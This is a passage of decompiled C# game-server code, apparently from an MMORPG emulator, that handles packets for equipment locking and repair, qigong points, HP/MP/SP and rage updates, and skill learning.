		public void 设置副本难度(byte[] 封包数据, int 封包大小)
		{
			int 人物ID = BitConverter.ToInt16(封包数据, 4);
			int value = BitConverter.ToInt16(封包数据, 10);
			if (得到人物数据(人物ID) == null)
			{
				return;
			}
			using 发包类 发包类 = new 发包类();
			发包类.Write(value);
			if (!World.Teams.TryGetValue(组队id, out var value2))
			{
				return;
			}
			foreach (Players value3 in value2.组队列表.Values)
			{
				if (value3.Client != null)
				{
					value3.Client.SendPak(发包类, 8729, value3.人物全服ID);
				}
			}
		}

		public void 穿针引线(byte[] 封包数据, int 封包大小)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA552A002C01E1001C00030014DC143C00000000000001000000010000000000000000000000000000000000000055AA");
				int num = 封包数据[24];
				int 位置 = 封包数据[20];
				byte[] 物品ID = 装备栏包裹[num].物品ID;
				if (!World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out var value) || value.FLD_RESIDE2 != 1)
				{
					return;
				}
				byte[] 物品ID2 = new byte[4];
				byte[] array2 = new byte[57];
				byte[] 物品全局ID = 装备栏包裹[num].物品全局ID;
				string text = 装备栏包裹[num].Get物品ID.ToString().Substring(1, 1);
				Buffer.BlockCopy(装备栏包裹[num].物品_byte, 16, array2, 0, 57);
				if (text != null)
				{
					if (!(text == "1"))
					{
						if (text == "2")
						{
							物品ID2 = BitConverter.GetBytes(BitConverter.ToInt32(物品ID, 0) - 10000000);
						}
					}
					else
					{
						物品ID2 = BitConverter.GetBytes(BitConverter.ToInt32(物品ID, 0) + 10000000);
					}
				}
				减去物品(num, 1);
				减去物品(位置, 1);
				增加物品(物品全局ID, 物品ID2, num, BitConverter.GetBytes(1), array2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "使用穿针引线 出错 [" + base.Userid + "][" + base.UserName + "] " + ex.Message);
			}
		}

		public void 登记玉连环(byte[] data, int length)
		{
			byte[] array = Converter.hexStringToByte("AA550A00A100420104000100000055AA");
			玉连环.Clear();
			for (int i = 0; i < 6; i++)
			{
				byte[] array2 = new byte[4];
				try
				{
					Buffer.BlockCopy(data, i * 4 + 10, array2, 0, 4);
					if (BitConverter.ToInt32(array2, 0) != 0)
					{
						玉连环.Add(BitConverter.ToInt32(array2, 0));
					}
				}
				catch
				{
				}
			}
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 登记玉连环()
		{
			byte[] array = Converter.hexStringToByte("AA5532002C01C600240002000000E5EA0D0031BD0D0031BD0D0031BD0D00E6EA0D0031BD0D0031BD0D0031BD0D0000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(玉连环[0]), 0, array, 18, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(玉连环[1]), 0, array, 22, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(玉连环[2]), 0, array, 26, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(玉连环[3]), 0, array, 30, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(玉连环[4]), 0, array, 34, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(玉连环[5]), 0, array, 38, 4);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 装备加解锁(byte[] data, int length)
		{
			if (World.是否开启装备加解锁功能 == 0)
			{
				系统提示("装备加解锁功能未开放, 请联系客服人员。");
				return;
			}
			int num = data[10];
			int num2 = data[11];
			if (num2 < 0)
			{
				return;
			}
			CheckTreasureGems();
			switch (num)
			{
			case 1:
			{
				byte[] array = Converter.hexStringToByte("AA5510002C01DF0002000101000000000000E98955AA");
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				return;
			}
			case 3:
			{
				if (World.装备加锁消耗元宝 > 0)
				{
					if (base.FLD_RXPIONT < World.装备加锁消耗元宝 * num2)
					{
						系统提示("元宝不够了，加锁一件装备需要" + World.装备加锁消耗元宝 + "个元宝。");
						break;
					}
					检察元宝数据(World.装备加锁消耗元宝 * num2, 0, "加锁");
					SaveGemData();
					RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "加锁装备消耗", 1, World.装备加锁消耗元宝 * num2);
				}
				for (int i = 0; i < num2; i++)
				{
					int num3 = data[29 + i * 18];
					byte[] array2 = new byte[56];
					装备栏包裹[num3].物品绑定 = true;
					装备栏包裹[num3].锁定 = true;
					byte[] 物品ID = 装备栏包裹[num3].物品ID;
					byte[] 物品全局ID = 装备栏包裹[num3].物品全局ID;
					Buffer.BlockCopy(装备栏包裹[num3].物品_byte, 16, array2, 0, World.物品属性大小);
					减去物品(num3, 1);
					增加物品(物品全局ID, 物品ID, num3, BitConverter.GetBytes(1), array2, 绑定: true);
					系统提示("恭喜，加锁成功！");
				}
				break;
			}
			case 4:
				if (World.装备解锁消耗元宝 <= 0)
				{
					break;
				}
				if (base.FLD_RXPIONT < World.装备解锁消耗元宝 * num2)
				{
					系统提示("元宝不够了，解锁一件装备需要" + World.装备解锁消耗元宝 + "个元宝。");
					break;
				}
				检察元宝数据(World.装备解锁消耗元宝 * num2, 0, "解锁");
				SaveGemData();
				RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "解锁装备消耗", 1, World.装备解锁消耗元宝 * num2);
				解锁包 = data;
				解锁数量 = num2;
				if (安全码是否通过验证)
				{
					解锁装备(data, num2);
				}
				else
				{
					发送安全码消息(6);
				}
				系统提示("恭喜，解锁成功！");
				break;
			}
			发送加解锁装备数据();
		}

		public void 发送加解锁装备数据()
		{
			byte[] array = Converter.hexStringToByte("AA5510002C01DF0002000101000000000000E98955AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 解锁装备(byte[] data, int 数量)
		{
			try
			{
				for (int i = 0; i < 数量; i++)
				{
					int num = data[29 + i * 18];
					byte[] array = new byte[56];
					装备栏包裹[num].物品绑定 = false;
					装备栏包裹[num].锁定 = false;
					byte[] 物品ID = 装备栏包裹[num].物品ID;
					byte[] 物品全局ID = 装备栏包裹[num].物品全局ID;
					Buffer.BlockCopy(装备栏包裹[num].物品_byte, 16, array, 0, World.物品属性大小);
					减去物品(num, 1);
					增加物品(物品全局ID, 物品ID, num, BitConverter.GetBytes(1), array, 绑定: false);
				}
			}
			catch
			{
			}
		}

		public void 装备修理(byte[] 封包数据, int 封包大小)
		{
			byte[] array = Converter.hexStringToByte("AA556A00000025315C00000000000A000000FEFFFFFF00000000B580FA0500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010A755AA");
			byte[] array2 = new byte[2];
			byte[] array3 = new byte[2];
			Buffer.BlockCopy(封包数据, 10, array2, 0, 2);
			Buffer.BlockCopy(封包数据, 14, array3, 0, 2);
			int num = BitConverter.ToInt16(array2, 0);
			int num2 = BitConverter.ToInt16(array3, 0);
			int num3 = BitConverter.ToInt16(封包数据, 22);
			if (num == 1)
			{
				switch (num2)
				{
				case 13:
				{
					int num6 = 0;
					for (int k = 0; k < 6; k++)
					{
						if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏已穿装备[k].物品ID, 0), out var value3) && (value3.FLD_RESIDE2 == 1 || value3.FLD_RESIDE2 == 2 || value3.FLD_RESIDE2 == 4 || value3.FLD_RESIDE2 == 5 || value3.FLD_RESIDE2 == 6) && value3.FLD_NJ > 0 && !装备栏已穿装备[k].锁定 && !装备栏已穿装备[k].锁定 && !装备栏已穿装备[k].物品绑定 && !装备栏已穿装备[k].物品绑定 && 装备栏已穿装备[k].FLD_FJ_NJ != value3.FLD_NJ)
						{
							num6 += value3.FLD_NJ - 装备栏已穿装备[k].FLD_FJ_NJ;
						}
					}
					if (num6 == 0)
					{
						修理提示1(num, num2, 251, 0L);
						return;
					}
					Buffer.BlockCopy(array2, 0, array, 10, 2);
					Buffer.BlockCopy(array3, 0, array, 14, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 34, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(num6), 0, array, 42, 4);
					break;
				}
				case 12:
				{
					int num4 = 0;
					for (int i = 0; i < 6; i++)
					{
						if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏已穿装备[i].物品ID, 0), out var value) && (value.FLD_RESIDE2 == 1 || value.FLD_RESIDE2 == 2 || value.FLD_RESIDE2 == 4 || value.FLD_RESIDE2 == 5 || value.FLD_RESIDE2 == 6) && value.FLD_NJ > 0 && !装备栏已穿装备[i].锁定 && !装备栏已穿装备[i].锁定 && !装备栏已穿装备[i].物品绑定 && !装备栏已穿装备[i].物品绑定 && 装备栏已穿装备[i].FLD_FJ_NJ != value.FLD_NJ)
						{
							num4 += value.FLD_NJ - 装备栏已穿装备[i].FLD_FJ_NJ;
						}
					}
					if (base.Player_WuXun < num4)
					{
						修理提示1(num2, num3, 253, 装备栏包裹[num3].Get物品ID);
						系统提示("武勋不足" + num4 + "，不能继续修理物品。");
						return;
					}
					for (int j = 0; j < 6; j++)
					{
						if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏已穿装备[j].物品ID, 0), out var value2) && (value2.FLD_RESIDE2 == 1 || value2.FLD_RESIDE2 == 2 || value2.FLD_RESIDE2 == 4 || value2.FLD_RESIDE2 == 5 || value2.FLD_RESIDE2 == 6) && value2.FLD_NJ > 0 && !装备栏已穿装备[j].锁定 && !装备栏已穿装备[j].锁定 && !装备栏已穿装备[j].物品绑定 && !装备栏已穿装备[j].物品绑定 && 装备栏已穿装备[j].FLD_FJ_NJ != value2.FLD_NJ)
						{
							int num5 = value2.FLD_NJ - 装备栏已穿装备[j].FLD_FJ_NJ;
							if (BitConverter.ToInt32(装备栏已穿装备[j].物品ID, 0) != 0)
							{
								装备栏已穿装备[j].FLD_FJ_NJ = value2.FLD_NJ;
								base.Player_WuXun -= num5;
							}
						}
					}
					Buffer.BlockCopy(array2, 0, array, 10, 2);
					Buffer.BlockCopy(array3, 0, array, 14, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(num4), 0, array, 42, 4);
					初始化已装备物品();
					计算人物装备数据();
					更新武功和状态();
					break;
				}
				}
			}
			else
			{
				switch (num2)
				{
				case 10:
					try
					{
						if (装备栏包裹[num3].锁定 || 装备栏包裹[num3].物品绑定)
						{
							return;
						}
						合成物品表.Clear();
						if (合成物品表.ContainsKey(1))
						{
							return;
						}
						if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num3].物品ID, 0), out var value6))
						{
							if (value6.FLD_RESIDE2 != 1 && value6.FLD_RESIDE2 != 2 && value6.FLD_RESIDE2 != 4 && value6.FLD_RESIDE2 != 5 && value6.FLD_RESIDE2 != 6)
							{
								return;
							}
							if (装备栏包裹[num3].FLD_FJ_NJ == value6.FLD_NJ)
							{
								修理提示1(num2, num3, 254, 装备栏包裹[num3].Get物品ID);
								return;
							}
							if (value6.FLD_NJ <= 0)
							{
								修理提示1(num2, num3, 255, 装备栏包裹[num3].Get物品ID);
								return;
							}
						}
						if (base.Player_WuXun < value6.FLD_NJ - 装备栏包裹[num3].FLD_FJ_NJ)
						{
							系统提示("武勋不足" + (value6.FLD_NJ - 装备栏包裹[num3].FLD_FJ_NJ) + "，不能修理此物品。");
							return;
						}
						Buffer.BlockCopy(array2, 0, array, 10, 2);
						Buffer.BlockCopy(array3, 0, array, 14, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(num3), 0, array, 22, 4);
						Buffer.BlockCopy(装备栏包裹[num3].物品ID, 0, array, 26, 4);
						Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 34, 4);
						Buffer.BlockCopy(BitConverter.GetBytes(value6.FLD_NJ - 装备栏包裹[num3].FLD_FJ_NJ), 0, array, 42, 4);
						Buffer.BlockCopy(BitConverter.GetBytes(装备栏包裹[num3].FLD_FJ_NJ), 0, array, 90, 4);
						HcItimesClass value7 = new HcItimesClass
						{
							位置 = num3,
							物品 = 装备栏包裹[num3].物品_byte
						};
						装备栏包裹[num3].锁定 = true;
						合成物品表.TryAdd(1, value7);
					}
					catch (Exception ex3)
					{
						MainForm.WriteLine(1, "装备修理_放装备出错![" + base.Userid + "]-[" + base.UserName + "]" + ex3.Message);
						return;
					}
					break;
				case 11:
					try
					{
						if (合成物品表.TryGetValue(1, out var value5))
						{
							装备栏包裹[value5.位置].锁定 = false;
							合成物品表.Clear();
							Buffer.BlockCopy(array2, 0, array, 10, 2);
							Buffer.BlockCopy(array3, 0, array, 14, 2);
							合成系统解锁();
						}
						Buffer.BlockCopy(array2, 0, array, 10, 2);
						Buffer.BlockCopy(array3, 0, array, 14, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(num3), 0, array, 22, 4);
						Buffer.BlockCopy(装备栏包裹[num3].物品ID, 0, array, 26, 4);
					}
					catch (Exception ex2)
					{
						MainForm.WriteLine(1, "装备修理_取消出错![" + base.Userid + "]-[" + base.UserName + "]" + ex2.Message);
						return;
					}
					break;
				case 12:
					try
					{
						if (合成物品表.Count <= 0)
						{
							return;
						}
						HcItimesClass hcItimesClass = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass = 合成物品表[1];
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass.物品全局ID, 0))
						{
							return;
						}
						if (装备栏包裹[hcItimesClass.位置].物品绑定)
						{
							系统提示("绑定物品不能修理。");
							return;
						}
						if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass.物品id, 0), out var value4))
						{
							return;
						}
						int num7 = value4.FLD_NJ - hcItimesClass.FLD_FJ_NJ;
						if (BitConverter.ToInt32(装备栏包裹[hcItimesClass.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass.物品全局ID, 0))
						{
							装备栏包裹[hcItimesClass.位置].FLD_FJ_NJ = value4.FLD_NJ;
							base.Player_WuXun -= num7;
						}
						装备栏包裹[hcItimesClass.位置].锁定 = false;
						Buffer.BlockCopy(array2, 0, array, 10, 2);
						Buffer.BlockCopy(array3, 0, array, 14, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(hcItimesClass.位置), 0, array, 22, 4);
						Buffer.BlockCopy(装备栏包裹[hcItimesClass.位置].物品_byte, 8, array, 26, World.物品属性大小);
						Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 34, 4);
						Buffer.BlockCopy(BitConverter.GetBytes(num7), 0, array, 42, 4);
						合成物品表.Clear();
						合成系统解锁();
						初始化装备篮包裹();
						计算人物装备数据();
						更新武功和状态();
					}
					catch (Exception ex)
					{
						MainForm.WriteLine(1, "装备修理_ 修理出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
						return;
					}
					break;
				}
			}
			if (num != 0)
			{
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
		}

		public void 修理提示1(int 操作ID, int 修理ID, int type, long 物品ID)
		{
			byte[] array = Converter.hexStringToByte("AA556A00000025315C00FFFFFFFF0A000000FFFFFFFF00000000B580FA0500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010A755AA");
			Buffer.BlockCopy(BitConverter.GetBytes(修理ID), 0, array, 14, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(type), 0, array, 18, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(物品ID), 0, array, 26, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 加气功点(byte[] 封包数据, int 封包大小)
		{
			封包修改(封包数据, 封包大小);
			if (base.Player_Qigong_point < 1)
			{
				return;
			}
			try
			{
				int num = 0;
				int num2 = 0;
				byte[] array = new byte[2];
				Buffer.BlockCopy(封包数据, 82, array, 0, 2);
				byte[] array2 = new byte[2];
				Buffer.BlockCopy(封包数据, 94, array2, 0, 2);
				int num3 = BitConverter.ToUInt16(array, 0);
				int num4 = BitConverter.ToUInt16(array2, 0);
				int 气功类型 = 0;
				if (World.普通气功ID.Contains(num3))
				{
					for (int i = 0; i < 12; i++)
					{
						byte[] array3 = new byte[2];
						Buffer.BlockCopy(封包数据, 10 + i * 4, array3, 0, 2);
						if (BitConverter.ToInt16(array3, 0) != num3)
						{
							continue;
						}
						if (BitConverter.ToInt16(气功[i].气功_byte, 0) >= 20)
						{
							return;
						}
						if (num4 != 1)
						{
							num = BitConverter.ToInt16(气功[i].气功_byte, 0) + 1;
							base.Player_Qigong_point--;
						}
						else
						{
							int num5 = 20 - BitConverter.ToInt16(气功[i].气功_byte, 0);
							if (num5 >= base.Player_Qigong_point)
							{
								num5 = base.Player_Qigong_point;
							}
							num = BitConverter.ToInt16(气功[i].气功_byte, 0) + num5;
							base.Player_Qigong_point -= num5;
						}
						if (num > 20)
						{
							num = 20;
						}
						BitConverter.GetBytes(num);
						气功[i].气功量 = num;
					}
					goto IL_0292;
				}
				if (!升天气功.TryGetValue(num3, out var value) || value.气功量 >= 20)
				{
					goto IL_0292;
				}
				气功类型 = 1;
				if (value.气功量 >= 20)
				{
					return;
				}
				if (num4 == 1)
				{
					int num6 = 20 - value.气功量;
					if (num6 >= base.Player_Qigong_point)
					{
						num6 = base.Player_Qigong_point;
					}
					num2 = value.气功量 + num6;
					base.Player_Qigong_point -= num6;
				}
				else
				{
					num2 = value.气功量 + 1;
					base.Player_Qigong_point--;
				}
				if (num2 > 20)
				{
					num2 = 20;
				}
				value.气功量 = num2;
				goto IL_0292;
				IL_0292:
				if (num < 20)
				{
					最大气功触发(num3, 气功类型);
				}
				更新气功();
				更新武功和状态();
				更新HP_MP_SP();
			}
			catch (Exception)
			{
				系统提示("请用官服最新客户端");
			}
		}

		public void 最大气功触发(int 气功idd, int 气功类型)
		{
			byte[] array = Converter.hexStringToByte("AA554E00A202440058000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			if (气功类型 == 0)
			{
				for (int i = 0; i < 12; i++)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(得到气功ID(i, base.Player_Job)), 0, array, 10 + i * 4, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(气功[i].气功ID), 0, array, 12 + i * 4, 2);
				}
			}
			else
			{
				int num = 0;
				foreach (升天气功类 value in 升天气功.Values)
				{
					Buffer.BlockCopy(BitConverter.GetBytes(value.气功ID), 0, array, 10 + num * 4, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(value.气功量), 0, array, 12 + num * 4, 2);
					num++;
				}
			}
			Buffer.BlockCopy(BitConverter.GetBytes(气功idd), 0, array, 82, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.Player_Qigong_point), 0, array, 84, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(10), 0, array, 86, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
				string text = Converter.ToString(array);
			}
		}

		public void 更新HP_MP_SP()
		{
			try
			{
				if (组队id == 0 && GetAddState(1000000050))
				{
					追加状态列表[1000000050].时间结束事件();
				}
				if (base.人物_SP > base.人物最大_SP)
				{
					base.人物_SP = 0;
					if (base.Player_Job == 6)
					{
						怒气++;
						if (怒气 > 5)
						{
							怒气 = 5;
						}
					}
					else if (base.Player_Job == 7)
					{
						int num = 0;
						if (追加状态列表.ContainsKey(901301))
						{
							if (base.上河调计数 >= 3)
							{
								base.上河调计数 = 0;
							}
							switch (base.上河调计数)
							{
							case 0:
								num = 900401;
								break;
							case 1:
								num = 900403;
								break;
							case 2:
								num = 900403;
								break;
							}
							if (num != 0 && !检查和弦状态())
							{
								switch (num)
								{
								case 900401:
									base.琴师状态 = 16;
									break;
								case 900402:
									base.琴师状态 = 32;
									break;
								case 900403:
									base.琴师状态 = 64;
									break;
								}
								if (!追加状态列表.ContainsKey(num))
								{
									追加状态类 value = new 追加状态类(this, 60000, num, 0);
									追加状态列表.Add(num, value);
								}
								状态效果(BitConverter.GetBytes(num), 1, 60000);
								base.上河调计数++;
							}
						}
						else if (追加状态列表.ContainsKey(901302))
						{
							if (base.下河调计数 >= 3)
							{
								base.下河调计数 = 0;
							}
							switch (base.下河调计数)
							{
							case 0:
								num = 900401;
								break;
							case 1:
								num = 900402;
								break;
							case 2:
								num = 900402;
								break;
							}
							if (num != 0 && !检查和弦状态())
							{
								switch (num)
								{
								case 900401:
									base.琴师状态 = 16;
									break;
								case 900402:
									base.琴师状态 = 32;
									break;
								case 900403:
									base.琴师状态 = 64;
									break;
								}
								if (!追加状态列表.ContainsKey(num))
								{
									追加状态类 value2 = new 追加状态类(this, 60000, num, 0);
									追加状态列表.Add(num, value2);
								}
								状态效果(BitConverter.GetBytes(num), 1, 60000);
								base.下河调计数++;
							}
						}
						else if (追加状态列表.ContainsKey(901303) && 玉连环 != null)
						{
							if (base.玉连环计数 >= 6)
							{
								base.玉连环计数 = 0;
							}
							switch (base.玉连环计数)
							{
							case 0:
								num = 玉连环[0];
								break;
							case 1:
								num = 玉连环[1];
								break;
							case 2:
								num = 玉连环[2];
								break;
							case 3:
								num = 玉连环[3];
								break;
							case 4:
								num = 玉连环[4];
								break;
							case 5:
								num = 玉连环[5];
								break;
							}
							if (num != 0 && !检查和弦状态())
							{
								switch (num)
								{
								case 900401:
									base.琴师状态 = 16;
									break;
								case 900402:
									base.琴师状态 = 32;
									break;
								case 900403:
									base.琴师状态 = 64;
									break;
								}
								if (!追加状态列表.ContainsKey(num))
								{
									追加状态类 value3 = new 追加状态类(this, 60000, num, 0);
									追加状态列表.Add(num, value3);
								}
								状态效果(BitConverter.GetBytes(num), 1, 60000);
								base.玉连环计数++;
							}
						}
						更新人物数据(this);
						更新广播人物数据();
					}
					else if (!GetAddState(700014) && base.Player_Job != 13)
					{
						int num2 = 10000 + (int)base.狂风万破;
						怒 = true;
						追加状态类 value4;
						if (base.Player_Job == 3)
						{
							double num3 = 0.25 + base.枪_末日狂舞;
							value4 = new 追加状态类(this, num2, 700014, 0, num3);
							addFLD_追加百分比_攻击(num3);
							addFLD_追加百分比_防御(num3);
						}
						else if (base.Player_Job == 5)
						{
							num2 = 10000 + (int)base.升天一气功_狂风天意 * 3000 + 3000;
							value4 = new 追加状态类(this, num2, 700014, 0);
							addFLD_追加百分比_攻击(0.15);
							addFLD_追加百分比_防御(0.2);
						}
						else if (base.Player_Job == 10)
						{
							double num4 = 0.25 + base.拳师_末日狂舞;
							value4 = new 追加状态类(this, num2, 700014, 0, num4);
							addFLD_追加百分比_攻击(num4);
							addFLD_追加百分比_防御(num4);
							拳师会心一击威力 = 0.3;
							拳师会心一击威力 += base.拳_升天三气功_精益求精;
						}
						else if (base.Player_Job == 11)
						{
							num2 = (int)base.梅_玄武神功 + 10000;
							double num5 = (int)(base.梅_障力运用 * 1.2);
							value4 = new 追加状态类(this, num2, 700014, 0, num5);
							addFLD_追加百分比_攻击(0.2);
							base.人物基本最大_障力 = (int)((double)base.人物基本最大_障力 * 1.2 + 0.5);
							base.梅_障力运用 += num5;
						}
						else
						{
							value4 = new 追加状态类(this, num2, 700014, 0);
							addFLD_追加百分比_攻击(0.25);
							addFLD_追加百分比_防御(0.25);
						}
						if (检查红月狂风状态())
						{
							base.FLD_人物_追加_攻击 += 150;
							base.FLD_人物_追加_防御 += 150;
						}
						追加状态列表.Remove(700014);
						if (!追加状态列表.ContainsKey(700014))
						{
							追加状态列表.Add(700014, value4);
						}
						状态效果(BitConverter.GetBytes(700014), 1, num2);
						更新人物数据(this);
						更新广播人物数据();
						更新武功和状态();
					}
					if (base.Player_Job == 13)
					{
						if (World.Teams.TryGetValue(组队id, out var value5))
						{
							foreach (Players value8 in value5.组队列表.Values)
							{
								if (value8.人物_HP > 0 && !value8.Player死亡 && !value8.Client.挂机 && 查找范围玩家(World.群体辅助组队范围, value8))
								{
									value8.神女怒 = true;
									追加状态类 value7 = new 追加状态类(value8, 3000, 1008002013, 0);
									value8.追加状态列表.Add(1008002013, value7);
									value8.状态效果(BitConverter.GetBytes(1008002013), 1, 3000);
								}
							}
						}
						else
						{
							追加状态类 value6 = new 追加状态类(this, 3000, 1008002013, 0);
							追加状态列表.Add(1008002013, value6);
							状态效果(BitConverter.GetBytes(1008002013), 1, 3000);
						}
					}
				}
				if (base.人物_HP > base.人物最大_HP)
				{
					base.人物_HP = base.人物最大_HP;
				}
				if (base.人物_MP > base.人物最大_MP)
				{
					base.人物_MP = base.人物最大_MP;
				}
				if (base.人物_AP > base.人物最大_AP)
				{
					base.人物_AP = base.人物最大_AP;
				}
				if (base.人物_HP < 0)
				{
					base.人物_HP = base.人物最大_HP;
				}
				if (base.人物_MP < 0)
				{
					base.人物_MP = base.人物最大_MP;
				}
				if (base.人物_AP < 0)
				{
					base.人物_AP = base.人物最大_AP;
				}
				using 发包类 发包类 = new 发包类();
				发包类.Write4(0);
				发包类.Write4(base.人物_HP);
				发包类.Write4(base.人物_MP);
				发包类.Write4(base.人物_SP);
				发包类.Write4(base.人物最大_HP);
				发包类.Write4(base.人物最大_MP);
				发包类.Write4(base.人物最大_SP);
				发包类.Write4(怒气);
				if (base.Player_Job == 11)
				{
					发包类.Write4(base.人物最大_AP);
					发包类.Write4(base.人物_AP);
					发包类.Write4((int)base.梅_障力运用 + base.FLD_装备_追加_障力恢复量);
				}
				else
				{
					发包类.Write4(0);
					发包类.Write4(0);
					发包类.Write4(0);
				}
				发包类.Write(0);
				发包类.Write(怒点);
				发包类.Write2(0);
				发包类.Write4(0);
				发包类.Write4(base.总罡气);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 26880, base.人物全服ID);
				}
			}
			catch
			{
			}
		}

		public void 清除怒气()
		{
			打坐 = false;
			if (PrivateState(700014))
			{
				追加状态类 追加状态类2 = 追加状态列表[700014];
				追加状态类2.时间结束事件();
			}
			if (base.人物_SP > 0)
			{
				base.人物_SP = 0;
				更新HP_MP_SP();
			}
		}

		public void 学习技能包(byte[] 封包数据, int 封包大小)
		{
			PacketReader packetReader = new PacketReader(封包数据, 封包大小, fixedSize: false);
			packetReader.Seek(4, SeekOrigin.Begin);
			int num = packetReader.ReadInt16();
			packetReader.Seek(10, SeekOrigin.Begin);
			int num2 = packetReader.ReadInt32();
			武功类 value2;
			if (num == base.人物全服ID)
			{
				if (!World.TBL_KONGFU.TryGetValue(num2, out var value))
				{
					return;
				}
				if (base.Player_Level < value.FLD_LEVEL)
				{
					系统提示("人物等级达到" + value.FLD_LEVEL + "级, 才能修炼。");
					return;
				}
				if (base.Player_Job_leve < value.FLD_JOBLEVEL)
				{
					系统提示("人物转职达到" + value.FLD_JOBLEVEL + "转, 才能修炼。");
					return;
				}
				if (base.Player_ExpErience < value.FLD_NEEDEXP)
				{
					系统提示("历练达到" + value.FLD_NEEDEXP + ", 才能修炼。");
					return;
				}
				武功类 武功类2 = new 武功类(num2);
				if (base.Player_Job == 8 || base.Player_Job == 9 || base.Player_Job == 13)
				{
					if (武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX] == null || 武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX].武功_等级 == 0)
					{
						if (武功类2.FLD_PID == 2009101)
						{
							for (int i = 0; i < 3; i++)
							{
								武功类2 = new 武功类(num2 + i)
								{
									武功_等级 = 1
								};
								武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX] = 武功类2;
							}
						}
						else if (武功类2.FLD_PID == 2009104)
						{
							for (int j = 0; j < 4; j++)
							{
								武功类2 = new 武功类(num2 + j)
								{
									武功_等级 = 1
								};
								武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX] = 武功类2;
							}
						}
						else if (武功类2.FLD_PID == 2009108)
						{
							for (int k = 0; k < 5; k++)
							{
								武功类2 = new 武功类(num2 + k)
								{
									武功_等级 = 1
								};
								武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX] = 武功类2;
							}
						}
						else if (武功类2.FLD_PID == 6000201)
						{
							for (int l = 0; l < 3; l++)
							{
								武功类2 = new 武功类(num2 + l)
								{
									武功_等级 = 1
								};
								武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX] = 武功类2;
							}
						}
						else if (武功类2.FLD_PID == 6000202)
						{
							for (int m = 0; m < 4; m++)
							{
								武功类2 = new 武功类(num2 + m)
								{
									武功_等级 = 1
								};
								武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX] = 武功类2;
							}
						}
						else if (武功类2.FLD_PID == 6000203)
						{
							for (int n = 0; n < 5; n++)
							{
								武功类2 = new 武功类(num2 + n)
								{
									武功_等级 = 1
								};
								武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX] = 武功类2;
							}
						}
						else if (武功类2.FLD_PID == 2000402 && 武功新[0, 23] == null)
						{
							return;
						}
						武功类2.武功_等级 = 1;
						武功新[武功类2.FLD_武功类型, 武功类2.FLD_INDEX] = 武功类2;
						base.Player_ExpErience -= value.FLD_NEEDEXP;
					}
					else
					{
